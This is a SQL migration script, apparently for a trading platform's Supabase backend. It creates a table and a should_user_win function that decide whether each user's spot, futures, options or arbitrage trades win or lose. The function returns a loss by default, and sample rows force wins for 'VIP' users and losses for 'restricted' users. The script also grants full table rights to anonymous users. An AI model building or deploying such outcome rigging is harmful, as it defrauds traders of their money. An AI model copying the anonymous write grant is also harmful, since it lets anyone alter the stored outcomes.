-- Final script to fix trade_outcomes table for LOSS by default behavior
-- Run this in Supabase SQL Editor

-- First, check if the table exists and drop it to recreate with correct structure
DROP TABLE IF EXISTS public.trade_outcomes CASCADE;

-- Create the trade_outcomes table with the correct structure
CREATE TABLE public.trade_outcomes (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    user_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
    enabled BOOLEAN DEFAULT false,
    outcome_type TEXT NOT NULL CHECK (outcome_type = ANY (ARRAY['win'::text, 'loss'::text, 'default'::text])),
    spot_enabled BOOLEAN DEFAULT false,
    futures_enabled BOOLEAN DEFAULT false,
    options_enabled BOOLEAN DEFAULT false,
    arbitrage_enabled BOOLEAN DEFAULT false,
    description TEXT,
    priority INTEGER DEFAULT 100,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_by UUID REFERENCES auth.users(id),
    updated_by UUID REFERENCES auth.users(id)
);

-- Create indexes
CREATE INDEX idx_trade_outcomes_user_id ON public.trade_outcomes(user_id);
CREATE INDEX idx_trade_outcomes_enabled ON public.trade_outcomes(enabled);
CREATE INDEX idx_trade_outcomes_priority ON public.trade_outcomes(priority, created_at);

-- Create trigger for updated_at
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = CURRENT_TIMESTAMP;
    RETURN NEW;
END;
$$ language 'plpgsql';

CREATE TRIGGER update_trade_outcomes_updated_at
    BEFORE UPDATE ON public.trade_outcomes
    FOR EACH ROW
    EXECUTE FUNCTION update_updated_at_column();

-- Grant permissions
GRANT ALL ON public.trade_outcomes TO authenticated;
GRANT ALL ON public.trade_outcomes TO service_role;
GRANT ALL ON public.trade_outcomes TO anon;

-- Create a function to check if user should win (LOSS by default)
CREATE OR REPLACE FUNCTION should_user_win(p_user_id UUID, p_trade_type TEXT DEFAULT 'options')
RETURNS BOOLEAN LANGUAGE plpgsql SECURITY DEFINER AS $$
DECLARE
    v_enabled BOOLEAN;
    v_outcome_type TEXT;
    v_type_enabled BOOLEAN;
BEGIN
    -- Check if user has an active outcome
    SELECT enabled, outcome_type INTO v_enabled, v_outcome_type
    FROM trade_outcomes
    WHERE user_id = p_user_id
        AND enabled = true
        AND (
            (p_trade_type = 'spot' AND spot_enabled) OR
            (p_trade_type = 'futures' AND futures_enabled) OR
            (p_trade_type = 'options' AND options_enabled) OR
            (p_trade_type = 'arbitrage' AND arbitrage_enabled)
        )
    ORDER BY priority ASC, created_at DESC
    LIMIT 1;
    
    -- Return result based on outcome type
    IF v_enabled THEN
        CASE v_outcome_type
            WHEN 'win' THEN
                RETURN true; -- FORCE WIN
            WHEN 'loss' THEN
                RETURN false; -- FORCE LOSS
            WHEN 'default' THEN
                RETURN false; -- DEFAULT LOSS
        END CASE;
    END IF;
    
    -- Default: LOSS
    RETURN false;
END;
$$;

-- Grant execute permission
GRANT EXECUTE ON FUNCTION should_user_win TO authenticated;
GRANT EXECUTE ON FUNCTION should_user_win TO service_role;

-- Create a view to see active outcomes (simplified - no user profile fields)
CREATE OR REPLACE VIEW active_trade_outcomes AS
SELECT 
    to2.*,
    CASE
        WHEN to2.outcome_type = 'win' THEN 'FORCE WIN'
        WHEN to2.outcome_type = 'loss' THEN 'FORCE LOSS'
        ELSE 'Default (LOSS)'
    END as outcome_label,
    CASE
        WHEN to2.spot_enabled AND to2.futures_enabled AND to2.options_enabled AND to2.arbitrage_enabled THEN 'All'
        WHEN to2.spot_enabled THEN 'Spot Only'
        WHEN to2.futures_enabled THEN 'Futures Only'
        WHEN to2.options_enabled THEN 'Options Only'
        WHEN to2.arbitrage_enabled THEN 'Arbitrage Only'
        ELSE 'Custom'
    END as enabled_types
FROM trade_outcomes to2
WHERE to2.enabled = true 
ORDER BY to2.priority ASC, to2.created_at DESC;

-- Grant access to the view
GRANT SELECT ON active_trade_outcomes TO authenticated;
GRANT SELECT ON active_trade_outcomes TO service_role;

-- Sample data for testing (replace USER_UUID_HERE with actual user UUID from auth.users table)
-- Force WIN for a specific user (VIP user)
INSERT INTO public.trade_outcomes (
    user_id,
    enabled,
    outcome_type,
    spot_enabled,
    futures_enabled,
    options_enabled,
    arbitrage_enabled,
    description,
    priority,
    created_at,
    updated_at
) VALUES (
    'USER_UUID_HERE', -- Replace with actual user UUID
    true,
    'win',
    true,
    true,
    true,
    true,
    'VIP user - Force WIN enabled',
    1,
    NOW(),
    NOW()
);

-- Force LOSS for a specific user (restricted user)
INSERT INTO public.trade_outcomes (
    user_id,
    enabled,
    outcome_type,
    spot_enabled,
    futures_enabled,
    options_enabled,
    arbitrage_enabled,
    description,
    priority,
    created_at,
    updated_at
) VALUES (
    'USER_UUID_HERE', -- Replace with actual user UUID
    true,
    'loss',
    true,
    true,
    true,
    true,
    'Restricted user - Force LOSS enabled',
    1,
    NOW(),
    NOW()
);

-- Options-only force WIN user
INSERT INTO public.trade_outcomes (
    user_id,
    enabled,
    outcome_type,
    spot_enabled,
    futures_enabled,
    options_enabled,
    arbitrage_enabled,
    description,
    priority,
    created_at,
    updated_at
) VALUES (
    'USER_UUID_HERE', -- Replace with actual user UUID
    true,
    'win',
    false,
    false,
    true,
    false,
    'Options trading only - Force WIN',
    1,
    NOW(),
    NOW()
);

-- Create a simple function to test the system
CREATE OR REPLACE FUNCTION test_user_outcome(p_user_id UUID, p_trade_type TEXT DEFAULT 'options')
RETURNS TABLE (
    should_win boolean,
    outcome_label TEXT,
    outcome_type TEXT
) LANGUAGE plpgsql SECURITY DEFINER AS $$
BEGIN
    RETURN QUERY
    SELECT 
        should_user_win(p_user_id, p_trade_type) as should_win,
        CASE 
            WHEN should_user_win(p_user_id, p_trade_type) THEN 'WIN (Admin Forced)'
            ELSE 'LOSS (Default)'
        END as outcome_label,
        CASE 
            WHEN should_user_win(p_user_id, p_trade_type) THEN 'win'
            ELSE 'loss'
        END as outcome_type;
END;
$$;

-- Grant execute permission for testing
GRANT EXECUTE ON FUNCTION test_user_outcome TO authenticated;
GRANT EXECUTE ON FUNCTION test_user_outcome TO service_role;

COMMIT;
